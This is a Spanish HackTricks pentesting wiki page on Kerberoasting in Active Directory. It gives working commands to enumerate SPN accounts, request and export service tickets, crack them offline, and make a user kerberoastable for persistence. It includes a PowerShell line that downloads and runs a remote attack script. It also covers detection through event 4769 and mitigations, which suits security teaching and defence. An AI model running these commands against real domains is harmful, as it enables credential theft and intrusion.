# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilice [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias más avanzadas del mundo.\
¡Obtenga acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprenda hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si desea ver su **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtenga [**productos oficiales de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únase al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígame** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparta sus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Kerberoast

Kerberoasting se centra en la adquisición de **tickets TGS**, específicamente aquellos relacionados con servicios que operan bajo **cuentas de usuario** en **Active Directory (AD)**, excluyendo las **cuentas de computadora**. La encriptación de estos tickets utiliza claves que provienen de las **contraseñas de usuario**, lo que permite la posibilidad de **descifrado de credenciales sin conexión**. El uso de una cuenta de usuario como servicio se indica por una propiedad **"ServicePrincipalName"** no vacía.

Para ejecutar **Kerberoasting**, es esencial contar con una cuenta de dominio capaz de solicitar **tickets TGS**; sin embargo, este proceso no requiere **privilegios especiales**, por lo que es accesible para cualquier persona con **credenciales de dominio válidas**.

### Puntos Clave:
- **Kerberoasting** apunta a los **tickets TGS** de **servicios de cuentas de usuario** dentro de **AD**.
- Los tickets encriptados con claves de **contraseñas de usuario** pueden ser **descifrados sin conexión**.
- Un servicio se identifica por un **ServicePrincipalName** que no es nulo.
- No se necesitan **privilegios especiales**, solo **credenciales de dominio válidas**.

### **Ataque**

{% hint style="warning" %}
Las **herramientas de Kerberoasting** suelen solicitar **`cifrado RC4`** al realizar el ataque e iniciar solicitudes TGS-REQ. Esto se debe a que **RC4 es** [**más débil**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) y más fácil de descifrar sin conexión utilizando herramientas como Hashcat que otros algoritmos de cifrado como AES-128 y AES-256.\
Los hashes RC4 (tipo 23) comienzan con **`$krb5tgs$23$*`** mientras que los de AES-256 (tipo 18) comienzan con **`$krb5tgs$18$*`**.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Herramientas multifuncionales que incluyen un volcado de usuarios kerberoastable:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Enumerar usuarios vulnerables al ataque Kerberoast**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Técnica 1: Solicitar TGS y volcarlo de la memoria**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Técnica 2: Herramientas automáticas**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Cuando se solicita un TGS, se genera el evento de Windows `4769 - Se solicitó un ticket de servicio Kerberos`.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir fácilmente y **automatizar flujos de trabajo** impulsados por las herramientas comunitarias más avanzadas del mundo.\
Obtén acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Cracking
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Persistencia

Si tienes **suficientes permisos** sobre un usuario, puedes **hacerlo susceptible al ataque Kerberoast**:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Puedes encontrar **herramientas** útiles para ataques de **kerberoast** aquí: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Si encuentras este **error** desde Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** se debe a la hora local, necesitas sincronizar el host con el DC. Hay algunas opciones:

* `ntpdate <IP del DC>` - Obsoleto a partir de Ubuntu 16.04
* `rdate -n <IP del DC>`

### Mitigación

El kerberoasting puede llevarse a cabo con un alto grado de sigilo si es explotable. Para detectar esta actividad, se debe prestar atención al **Security Event ID 4769**, que indica que se ha solicitado un ticket Kerberos. Sin embargo, debido a la alta frecuencia de este evento, se deben aplicar filtros específicos para aislar actividades sospechosas:

- El nombre del servicio no debe ser **krbtgt**, ya que esta es una solicitud normal.
- Los nombres de servicio que terminan con **$** deben excluirse para evitar incluir cuentas de máquina utilizadas para servicios.
- Las solicitudes de máquinas deben filtrarse excluyendo nombres de cuenta formateados como **máquina@dominio**.
- Solo se deben considerar las solicitudes de ticket exitosas, identificadas por un código de error de **'0x0'**.
- **Lo más importante**, el tipo de cifrado del ticket debe ser **0x17**, que a menudo se utiliza en ataques de Kerberoasting.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Para mitigar el riesgo de Kerberoasting:

- Asegúrese de que las **Contraseñas de Cuenta de Servicio sean difíciles de adivinar**, recomendando una longitud de más de **25 caracteres**.
- Utilice **Cuentas de Servicio Administradas**, que ofrecen beneficios como **cambios automáticos de contraseña** y **gestión delegada del Nombre Principal de Servicio (SPN)**, mejorando la seguridad contra tales ataques.

Al implementar estas medidas, las organizaciones pueden reducir significativamente el riesgo asociado con el Kerberoasting.


## Kerberoast sin cuenta de dominio

En **septiembre de 2022**, se dio a conocer una nueva forma de explotar un sistema por un investigador llamado Charlie Clark, compartida a través de su plataforma [exploit.ph](https://exploit.ph/). Este método permite la adquisición de **Tickets de Servicio (ST)** a través de una solicitud **KRB_AS_REQ**, lo cual no requiere control sobre ninguna cuenta de Active Directory. Básicamente, si un principal está configurado de tal manera que no requiere preautenticación, una situación similar a lo que se conoce en el ámbito de la ciberseguridad como un ataque de **AS-REP Roasting**, esta característica puede ser aprovechada para manipular el proceso de solicitud. Específicamente, al alterar el atributo **sname** dentro del cuerpo de la solicitud, el sistema es engañado para emitir un **ST** en lugar del Ticket de Concesión de Tiquete (TGT) cifrado estándar.

La técnica está completamente explicada en este artículo: [publicación de blog de Semperis](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Debe proporcionar una lista de usuarios porque no tenemos una cuenta válida para consultar el LDAP utilizando esta técnica.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py de PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus de PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referencias
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir y **automatizar flujos de trabajo** fácilmente con las herramientas comunitarias **más avanzadas** del mundo.\
¡Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
